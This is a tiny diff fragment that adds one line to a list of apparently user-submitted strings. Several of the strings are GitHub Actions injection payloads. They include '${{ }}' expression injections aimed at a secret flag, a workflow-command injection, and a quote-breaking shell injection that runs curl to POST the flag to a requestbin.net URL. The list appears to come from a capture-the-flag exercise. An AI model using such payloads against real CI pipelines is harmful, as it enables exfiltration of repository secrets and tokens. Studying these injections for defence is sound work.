@@ -480,3 +480,4 @@ jiayuqi7813::set-output name=COMMENT_ID::1; console.log(context); console.log(pr
 AFKL-CUIT:${{ secret.FLAG }}
 AFKL-CUIT:"
 AFKL-CUIT:";curl -X POST -d "fizz=$flag" http://requestbin.net/r/f3ixi7j0;echo "
+R1gelX29:${{ github.event.issue.user.login }}
